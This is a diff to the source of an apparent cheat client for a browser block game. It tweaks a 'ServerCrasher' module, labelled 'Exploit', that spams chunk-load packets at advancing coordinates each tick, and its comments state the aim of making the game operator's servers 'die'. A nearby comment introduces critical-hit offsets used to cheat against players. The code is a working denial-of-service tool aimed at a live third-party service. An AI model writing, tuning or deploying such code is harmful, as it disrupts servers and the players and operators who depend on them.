@@ -1536,15 +1536,14 @@ clientVersion: VERSION$1
 			// and later shared it to me when we were talking
 			// about the upcoming bloxd layer
 
-			let serverCrasherStartX, serverCrasherStartZ;
 			let serverCrasherPacketsPerTick;
 			// if I recall, each chunk is 16 blocks or something.
 			// maybe we can get vector's servers to die by sending funny values or something idk.
 			const SERVER_CRASHER_CHUNK_XZ_INCREMENT = 16;
 			const serverCrasher = new Module("ServerCrasher", cb => {
 				if (cb) {
-					let x = serverCrasherStartX[1];
-					let z = serverCrasherStartZ[1];
+					let x = 10;
+					let z = 10;
 					tickLoop["ServerCrasher"] = function() {
 						for (let _ = 0; _ < serverCrasherPacketsPerTick[1]; _++) {
 							x += SERVER_CRASHER_CHUNK_XZ_INCREMENT;
@@ -1559,10 +1558,8 @@ clientVersion: VERSION$1
 					delete tickLoop["ServerCrasher"];
 				}
 			}, "Exploit", () => "Spam Chunk Load");
-			
-			serverCrasherStartX = serverCrasher.addoption("Start X", Number, 99e9);
-			serverCrasherStartZ = serverCrasher.addoption("Start Z", Number, 99e9);
-			serverCrasherPacketsPerTick = serverCrasher.addoption("Packets Per Tick", Number, 16);
+
+			serverCrasherPacketsPerTick = serverCrasher.addoption("PacketsPerTick", Number, 10);
 
 			/** y offset values, that when used before attacking a player, gives a critical hit! **/
 			const CRIT_OFFSETS = [
